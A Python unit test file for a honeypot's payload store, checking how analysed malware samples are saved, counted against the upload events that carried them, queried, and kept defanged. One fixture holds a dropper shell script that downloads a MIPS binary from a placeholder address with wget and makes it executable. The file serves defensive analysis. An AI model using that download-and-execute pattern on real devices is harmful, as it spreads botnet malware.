"""Unit tests for payload persistence and the queries that surface it.

The analyser itself is covered in ``test_static_analysis.py``. What is tested
here is the seam: that an analysis result becomes a row, that the row is rolled
up against the events which actually carried the artefact, and that re-running
the scan is genuinely safe — the payload table is derived from bytes on disk
the same way ``attackers`` is derived from events, and a rescan that
double-counted or lost sightings would quietly corrupt both views.

One property gets its own test: indicators must still be defanged after a
round trip through the database. The analyser defangs on the way in and
nothing re-fangs, but "nothing re-fangs" is exactly the kind of claim that
stops being true when someone adds a convenience helper.
"""

from __future__ import annotations

import datetime as dt
import struct

import pytest

from pipeline.analysis import store
from storage import queries
from storage.models import EventType, Payload, utcnow

# --------------------------------------------------------------------------- #
# Fixtures
# --------------------------------------------------------------------------- #

SCRIPT = b"#!/bin/sh\ncd /tmp\nwget http://198.51.100.9/bins/x.mips\nchmod +x x.mips\n"


def mips_elf(trailer: bytes = b"/bin/busybox\x00") -> bytes:
    """A big-endian 32-bit MIPS ELF: static, stripped — the IoT dropper shape."""
    header = bytearray(52)
    header[0:4] = b"\x7fELF"
    header[4], header[5], header[6], header[7] = 1, 2, 1, 3
    struct.pack_into(">HH", header, 16, 2, 0x08)
    struct.pack_into(">I", header, 20, 1)
    struct.pack_into(">I", header, 28, 52)
    struct.pack_into(">I", header, 32, 52 + 32)
    struct.pack_into(">HH", header, 42, 32, 1)
    struct.pack_into(">HH", header, 46, 40, 1)
    ph = bytearray(32)
    struct.pack_into(">I", ph, 0, 1)  # PT_LOAD, no PT_INTERP -> static
    sh = bytearray(40)
    struct.pack_into(">I", sh, 4, 1)  # PROGBITS, no SYMTAB -> stripped
    return bytes(header + ph + sh) + trailer


@pytest.fixture
def payload_dir(tmp_path):
    """A payload store holding one ELF dropper and one shell script.

    Returns the directory alongside the digests, because the files are named
    by content hash and a test needs to name one without recomputing it.
    (``Path`` uses ``__slots__``, so the digests cannot ride along on it.)
    """
    import hashlib
    from types import SimpleNamespace

    directory = tmp_path / "payloads"
    directory.mkdir()

    digests = {}
    for name, data in (("elf", mips_elf()), ("script", SCRIPT)):
        digest = hashlib.sha256(data).hexdigest()
        (directory / f"{digest}.bin").write_bytes(data)
        digests[name] = digest
    return SimpleNamespace(path=directory, digests=digests)


@pytest.fixture
def dropped(db, make_event, payload_dir):
    """Two sources deliver the ELF, one of them twice. Nobody drops the script."""
    sha = payload_dir.digests["elf"]
    now = utcnow()
    db.add_all(
        [
            make_event(
                src_ip="45.33.32.10",
                event_type=EventType.FILE_UPLOAD.value,
                payload_sha256=sha,
                ts=now - dt.timedelta(hours=5),
            ),
            make_event(
                src_ip="45.33.32.10",
                event_type=EventType.FILE_UPLOAD.value,
                payload_sha256=sha,
                ts=now - dt.timedelta(hours=1),
            ),
            make_event(
                src_ip="8.8.8.8",
                event_type=EventType.FILE_UPLOAD.value,
                payload_sha256=sha,
                ts=now - dt.timedelta(hours=3),
            ),
            make_event(src_ip="45.33.32.10", event_type=EventType.COMMAND.value),
        ]
    )
    db.commit()
    return sha


# --------------------------------------------------------------------------- #
# Storing
# --------------------------------------------------------------------------- #


class TestScanAndStore:
    def test_analyses_every_artefact(self, db, payload_dir):
        stats = store.scan_and_store(db, payload_dir.path)
        db.commit()
        assert stats["analysed"] == 2
        assert stats["errors"] == 0
        assert db.query(Payload).count() == 2

    def test_elf_fields_are_persisted(self, db, payload_dir):
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        payload = queries.get_payload(db, payload_dir.digests["elf"])
        assert payload.file_type == "elf"
        assert payload.arch == "mips"
        assert payload.linkage == "static"
        assert payload.stripped is True
        assert "iot:busybox" in payload.behaviour_tags

    def test_script_fields_are_persisted(self, db, payload_dir):
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        payload = queries.get_payload(db, payload_dir.digests["script"])
        assert payload.file_type == "script-sh"
        assert payload.arch is None
        assert "downloader:wget" in payload.behaviour_tags

    def test_rescan_skips_what_is_already_analysed(self, db, payload_dir):
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        stats = store.scan_and_store(db, payload_dir.path)
        db.commit()
        assert stats["analysed"] == 0
        assert stats["skipped"] == 2
        assert db.query(Payload).count() == 2  # no duplicates

    def test_reanalyse_redoes_everything(self, db, payload_dir):
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        stats = store.scan_and_store(db, payload_dir.path, reanalyse=True)
        db.commit()
        assert stats["analysed"] == 2
        assert db.query(Payload).count() == 2

    def test_reanalysis_updates_in_place(self, db, payload_dir):
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        sha = payload_dir.digests["elf"]
        queries.get_payload(db, sha).arch = "wrong"
        db.commit()

        store.scan_and_store(db, payload_dir.path, reanalyse=True)
        db.commit()
        assert queries.get_payload(db, sha).arch == "mips"

    def test_limit_stops_early(self, db, payload_dir):
        stats = store.scan_and_store(db, payload_dir.path, limit=1)
        db.commit()
        assert stats["analysed"] == 1

    def test_missing_directory_is_not_an_error(self, db, tmp_path):
        assert store.scan_and_store(db, tmp_path / "nope")["seen"] == 0

    def test_non_payload_files_are_ignored(self, db, payload_dir):
        (payload_dir.path / "readme.txt").write_text("not a payload")
        assert store.scan_and_store(db, payload_dir.path)["seen"] == 2


# --------------------------------------------------------------------------- #
# Rollups
# --------------------------------------------------------------------------- #


class TestRollups:
    def test_sightings_are_counted_from_events(self, db, payload_dir, dropped):
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        payload = queries.get_payload(db, dropped)
        assert payload.event_count == 3  # two from one source, one from another

    def test_first_and_last_seen_span_the_sightings(self, db, payload_dir, dropped):
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        payload = queries.get_payload(db, dropped)
        assert payload.first_seen < payload.last_seen
        assert (payload.last_seen - payload.first_seen) > dt.timedelta(hours=3)

    def test_artefact_with_no_events_still_stores(self, db, payload_dir, dropped):
        # Someone drops a file in by hand, or retention pruned the event. The
        # analysis stands on its own; it simply has no sightings.
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        orphan = queries.get_payload(db, payload_dir.digests["script"])
        assert orphan is not None
        assert orphan.event_count == 0
        assert orphan.first_seen is None

    def test_only_matching_events_are_counted(self, db, payload_dir, dropped):
        # The COMMAND event from the same IP carries no payload hash.
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        assert queries.get_payload(db, dropped).event_count == 3

    def test_refresh_rollups_picks_up_new_sightings(self, db, payload_dir, dropped, make_event):
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        db.add(
            make_event(
                src_ip="93.184.216.34",
                event_type=EventType.FILE_UPLOAD.value,
                payload_sha256=dropped,
            )
        )
        db.commit()

        assert store.refresh_rollups(db) == 2
        db.commit()
        assert queries.get_payload(db, dropped).event_count == 4

    def test_rescan_does_not_double_count(self, db, payload_dir, dropped):
        store.scan_and_store(db, payload_dir.path)
        db.commit()
        store.scan_and_store(db, payload_dir.path, reanalyse=True)
        db.commit()
        assert queries.get_payload(db, dropped).event_count == 3


# --------------------------------------------------------------------------- #
# Queries
# --------------------------------------------------------------------------- #


@pytest.fixture
def stored(db, payload_dir, dropped):
    store.scan_and_store(db, payload_dir.path)
    db.commit()
    return payload_dir.digests


class TestListPayloads:
    def test_lists_everything_by_default(self, db, stored):
        rows, total = queries.list_payloads(db)
        assert total == 2
        assert len(rows) == 2

    def test_filter_by_file_type(self, db, stored):
        rows, total = queries.list_payloads(db, file_type="elf")
        assert total == 1
        assert rows[0].sha256 == stored["elf"]

    def test_filter_by_architecture(self, db, stored):
        rows, total = queries.list_payloads(db, arch="mips")
        assert total == 1

    def test_filter_by_behaviour_tag(self, db, stored):
        rows, total = queries.list_payloads(db, behaviour_tag="downloader:wget")
        assert total == 1
        assert rows[0].sha256 == stored["script"]

    def test_unmatched_behaviour_tag_returns_nothing(self, db, stored):
        _, total = queries.list_payloads(db, behaviour_tag="miner:xmrig")
        assert total == 0

    def test_packed_only_filter(self, db, stored):
        # Neither fixture is high-entropy, so this must narrow to nothing
        # rather than quietly returning everything.
        _, total = queries.list_payloads(db, packed_only=True)
        assert total == 0

    def test_unknown_sort_falls_back_rather_than_raising(self, db, stored):
        rows, _ = queries.list_payloads(db, sort="not_a_column")
        assert len(rows) == 2

    def test_pagination(self, db, stored):
        page1, total = queries.list_payloads(db, limit=1, offset=0)
        page2, _ = queries.list_payloads(db, limit=1, offset=1)
        assert total == 2
        assert page1[0].sha256 != page2[0].sha256

    def test_sort_by_size(self, db, stored):
        rows, _ = queries.list_payloads(db, sort="size")
        assert rows[0].size >= rows[1].size


class TestPayloadJoins:
    def test_payloads_for_attacker(self, db, stored):
        rows = queries.payloads_for_attacker(db, "45.33.32.10")
        assert [r.sha256 for r in rows] == [stored["elf"]]

    def test_attacker_with_no_uploads_has_no_payloads(self, db, stored):
        assert queries.payloads_for_attacker(db, "203.0.113.99") == []

    def test_the_same_artefact_is_listed_once_per_attacker(self, db, stored):
        # 45.33.32.10 delivered it twice; the profile must show one artefact.
        assert len(queries.payloads_for_attacker(db, "45.33.32.10")) == 1

    def test_payload_sources_lists_every_deliverer(self, db, stored):
        sources = queries.payload_sources(db, stored["elf"])
        assert {s["src_ip"] for s in sources} == {"45.33.32.10", "8.8.8.8"}

    def test_payload_sources_counts_per_source(self, db, stored):
        by_ip = {s["src_ip"]: s for s in queries.payload_sources(db, stored["elf"])}
        assert by_ip["45.33.32.10"]["events"] == 2
        assert by_ip["8.8.8.8"]["events"] == 1

    def test_payload_sources_for_an_unseen_artefact(self, db, stored):
        assert queries.payload_sources(db, "0" * 64) == []

    def test_arch_breakdown(self, db, stored):
        rows = queries.payload_arch_breakdown(db)
        assert rows == [{"arch": "mips", "count": 1}]

    def test_arch_breakdown_excludes_formats_without_one(self, db, stored):
        # The shell script has no architecture and must not appear as null.
        assert all(row["arch"] is not None for row in queries.payload_arch_breakdown(db))


# --------------------------------------------------------------------------- #
# The defanging contract, across a database round trip
# --------------------------------------------------------------------------- #


class TestIndicatorsSurviveStorageDefanged:
    def test_stored_urls_are_still_defanged(self, db, stored):
        payload = queries.get_payload(db, stored["script"])
        assert payload.iocs["urls"] == ["hxxp://198[.]51[.]100[.]9/bins/x[.]mips"]

    def test_nothing_readable_from_the_row_is_a_live_link(self, db, stored):
        for payload in db.query(Payload).all():
            for values in (payload.iocs or {}).values():
                for value in values:
                    assert not value.startswith("http")
